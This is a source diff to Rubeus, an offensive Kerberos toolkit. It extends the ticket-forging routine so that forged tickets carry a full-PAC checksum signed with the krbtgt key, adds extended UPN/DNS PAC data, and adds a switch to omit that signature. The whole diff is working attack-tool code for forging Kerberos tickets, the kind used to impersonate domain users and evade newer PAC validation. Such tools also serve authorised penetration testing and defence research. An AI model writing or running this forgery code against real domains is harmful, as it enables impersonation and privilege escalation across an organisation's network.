@@ -62,6 +62,7 @@ namespace Rubeus
             List<int> resourceGroups = null,
             Interop.PacUserAccountControl uac = Interop.PacUserAccountControl.NORMAL_ACCOUNT,
             bool newPac = true,
+            bool extendedUpnDns = false,
             // arguments to deal with resulting ticket(s)
             string outfile = null,
             bool ptt = false,
@@ -72,7 +73,8 @@ namespace Rubeus
             string cRealm = null,
             string s4uProxyTarget = null,
             string s4uTransitedServices = null,
-            bool includeAuthData = false
+            bool includeAuthData = false,
+            bool noFullPacSig = false
             )
         {
             // vars
@@ -121,6 +123,7 @@ namespace Rubeus
                 kvi.ExtraSids = new Ndr._KERB_SID_AND_ATTRIBUTES[] {
                         new Ndr._KERB_SID_AND_ATTRIBUTES()};
             }
+            int upnFlags = 1;
 
             // get network credential from ldapuser and ldappassword
             if (!String.IsNullOrEmpty(ldapuser))
@@ -314,6 +317,11 @@ namespace Rubeus
                         }*/
                     }
 
+                    if (userObject.ContainsKey("userprincipalname") && !String.IsNullOrWhiteSpace((string)userObject["userprincipalname"]))
+                    {
+                        upnFlags = 0;
+                    }
+
                     List<IDictionary<string, Object>> adObjects = null;
 
                     // build group and domain policy filter
@@ -469,11 +477,26 @@ namespace Rubeus
                     }
                     if (userObject.ContainsKey("logoncount"))
                     {
-                        kvi.LogonCount = short.Parse((string)userObject["logoncount"]);
+                        try
+                        {
+                            kvi.LogonCount = short.Parse((string)userObject["logoncount"]);
+                        }
+                        catch
+                        {
+                            kvi.LogonCount = 0;
+                        }
                     }
                     if (userObject.ContainsKey("badpwdcount"))
                     {
-                        kvi.BadPasswordCount = short.Parse((string)userObject["badpwdcount"]);
+                        try
+                        {
+                            kvi.BadPasswordCount = short.Parse((string)userObject["badpwdcount"]);
+                        }
+                        catch
+                        {
+                            kvi.BadPasswordCount = 0;
+                        }
+                        
                     }
                     if (userObject.ContainsKey("lastlogon") && ((DateTime)userObject["lastlogon"] != DateTime.MinValue))
                     {
@@ -690,15 +713,18 @@ namespace Rubeus
             byte[] randKeyBytes;
             SignatureData svrSigData = new SignatureData(PacInfoBufferType.ServerChecksum);
             SignatureData kdcSigData = new SignatureData(PacInfoBufferType.KDCChecksum);
-            int svrSigLength = 12, kdcSigLength = 12;
+            SignatureData fullPacSigData = new SignatureData(PacInfoBufferType.FullPacChecksum);
+            int svrSigLength = 12, kdcSigLength = 12, fullPacSigLength = 12;
             if (etype == Interop.KERB_ETYPE.rc4_hmac)
             {
                 randKeyBytes = new byte[16];
                 random.NextBytes(randKeyBytes);
                 svrSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5;
                 kdcSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5;
+                fullPacSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5;
                 svrSigLength = 16;
                 kdcSigLength = 16;
+                fullPacSigLength = 16;
             }
             else if (etype == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)
             {
@@ -706,6 +732,7 @@ namespace Rubeus
                 random.NextBytes(randKeyBytes);
                 svrSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256;
                 kdcSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256;
+                fullPacSigData.SignatureType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256;
             }
             else
             {
@@ -717,13 +744,16 @@ namespace Rubeus
             if (krbKey != null)
             {
                 kdcSigData.SignatureType = krbeType;
+                fullPacSigData.SignatureType = krbeType;
                 if ((krbeType == Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256) || (krbeType == Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES128))
                 {
                     kdcSigLength = 12;
+                    fullPacSigLength = 12;
                 }
                 else
                 {
                     kdcSigLength = 16;
+                    fullPacSigLength = 16;
                 }
             }
 
@@ -772,7 +802,11 @@ namespace Rubeus
                 else
                     cn = new ClientName((DateTime)startTime, user);
 
-                UpnDns upnDns = new UpnDns(0, domain.ToUpper(), String.Format("{0}@{1}", user, domain.ToLower()));
+                UpnDns upnDns = new UpnDns(upnFlags, domain.ToUpper(), String.Format("{0}@{1}", user, domain.ToLower()));
+                if (extendedUpnDns)
+                {
+                    upnDns = new UpnDns(upnFlags + 2, domain.ToUpper(), String.Format("{0}@{1}", user, domain.ToLower()), user, new SecurityIdentifier(String.Format("{0}-{1}", li.KerbValidationInfo.LogonDomainId?.GetValue(), li.KerbValidationInfo.UserId)));
+                }
 
                 S4UDelegationInfo s4u = null;
                 if (!String.IsNullOrEmpty(s4uProxyTarget) && !String.IsNullOrEmpty(s4uTransitedServices))
@@ -853,6 +887,11 @@ namespace Rubeus
                 kdcSigData.Signature = new byte[kdcSigLength];
                 Array.Clear(svrSigData.Signature, 0, svrSigLength);
                 Array.Clear(kdcSigData.Signature, 0, kdcSigLength);
+                if (!noFullPacSig && !(parts[0].Equals("krbtgt") && parts[1].Equals(domain)))
+                {
+                    fullPacSigData.Signature = new byte[fullPacSigLength];
+                    Array.Clear(fullPacSigData.Signature, 0, fullPacSigLength);
+                }
 
                 // add sections to the PAC, get bytes and generate checksums
                 List<PacInfoBuffer> PacInfoBuffers = new List<PacInfoBuffer>();
@@ -874,8 +913,21 @@ namespace Rubeus
                 {
                     PacInfoBuffers.Add(ticketSigData);
                 }
+
+                // Get FullPacSig and insert
+                if (!noFullPacSig && !(parts[0].Equals("krbtgt") && parts[1].Equals(domain)))
+                {
+                    var newPacInfoBuffers = new List<PacInfoBuffer>(PacInfoBuffers);
+                    newPacInfoBuffers.Add(fullPacSigData);
+                    PACTYPE tmpPt = new PACTYPE(0, newPacInfoBuffers);
+                    byte[] tmpPtBytes = tmpPt.Encode();
+                    byte[] fullPacSig = Crypto.KerberosChecksum(krbKey, tmpPtBytes, fullPacSigData.SignatureType);
+                    fullPacSigData.Signature = fullPacSig;
+                    PacInfoBuffers.Add(fullPacSigData);
+                }
                 PACTYPE pt = new PACTYPE(0, PacInfoBuffers);
                 byte[] ptBytes = pt.Encode();
+
                 byte[] svrSig = Crypto.KerberosChecksum(serviceKey, ptBytes, svrSigData.SignatureType);
                 byte[] kdcSig = Crypto.KerberosChecksum(krbKey, svrSig, kdcSigData.SignatureType);
 
@@ -900,6 +952,10 @@ namespace Rubeus
                 if (ticketSigData != null)
                 {
                     PacInfoBuffers.Add(ticketSigData);
+                }
+                if (!noFullPacSig && !(parts[0].Equals("krbtgt") && parts[1].Equals(domain)))
+                {
+                    PacInfoBuffers.Add(fullPacSigData);
                 }
                 pt = new PACTYPE(0, PacInfoBuffers);
 
